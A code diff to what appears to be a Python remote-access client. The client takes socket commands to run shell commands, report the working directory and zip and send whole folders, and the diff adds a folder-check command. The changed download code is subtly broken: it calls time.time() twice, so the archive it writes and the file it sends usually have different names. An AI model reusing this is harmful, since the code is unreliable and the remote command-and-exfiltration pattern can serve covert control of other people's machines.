@@ -48,6 +48,7 @@ class EventID:
       GETCWD = 8
       GETPLATFORM = 9
       RUNCMD = 10
+      ISFOLDER = 11
       
 class dirEntry:
       def __init__(self, type, name):
@@ -246,8 +247,8 @@ while True:
                               
                   if action == EventID.DOWNLOADFOLDER:
                         path = jsonEntry['details']['path']
-                        shutil.make_archive(Env.temp_dir + path.split('/')[-1], 'zip', path)
-                        sendFile(Env.temp_dir + path.split('/')[-1] + '.zip')
+                        shutil.make_archive(Env.temp_dir + str(time.time()), 'zip', path)
+                        sendFile(Env.temp_dir + str(time.time()) + '.zip')
                         
                   if action == EventID.CHECKPATH:
                         path = jsonEntry['details']['path']
@@ -265,6 +266,9 @@ while True:
                         
                         conn.send(crypto.encrypt(pickle.dumps(commandoutput)))
 
+                  if action == EventID.ISFOLDER:
+                        path = jsonEntry['details']['path']
+                        conn.send(crypto.encrypt(pickle.dumps(os.path.isdir(path))))
                   
                         
             except ConnectionAbortedError:
